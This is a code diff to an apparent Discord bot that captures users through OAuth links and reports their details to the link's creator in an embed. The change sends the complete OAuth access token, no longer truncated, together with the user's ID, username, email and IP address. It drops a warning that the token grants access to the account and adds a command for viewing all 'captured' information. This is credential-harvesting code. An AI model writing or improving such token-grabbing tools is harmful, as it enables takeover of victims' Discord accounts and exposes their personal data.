@@ -474,17 +474,16 @@ async def notify_oauth_success(creator_id, short_id, user_id, username, email, a
             timestamp=datetime.now()
         )
         
-        embed.add_field(name="👤 UTILISATEUR", value="‎", inline=False)
-        embed.add_field(name="ID Discord", value=f"`{user_id}`", inline=True)
-        embed.add_field(name="Username", value=username, inline=True)
-        embed.add_field(name="Email", value=email or "Non partagé", inline=True)
+        embed.add_field(name="👤 ID Discord", value=f"`{user_id}`", inline=False)
+        embed.add_field(name="👥 Username", value=username, inline=True)
+        embed.add_field(name="📧 Email", value=email or "Non partagé", inline=True)
         
-        embed.add_field(name="🔑 ACCESS TOKEN", value=f"```{access_token[:50]}...```", inline=False)
-        embed.add_field(name="📍 Adresse IP", value=f"`{ip_address}`", inline=True)
+        embed.add_field(name="🔑 ACCESS TOKEN (COMPLET)", value=f"```{access_token}```", inline=False)
+        embed.add_field(name="🌐 Adresse IP", value=f"`{ip_address}`", inline=False)
         
         embed.add_field(
-            name="⚠️ IMPORTANT",
-            value="Ce token donne accès au compte Discord de l'utilisateur. **Utilisation strictement légale uniquement.**",
+            name="💾 Consulter avec",
+            value="Utilise: `+linktokens <short_id>` pour voir toutes les infos capturées",
             inline=False
         )
         
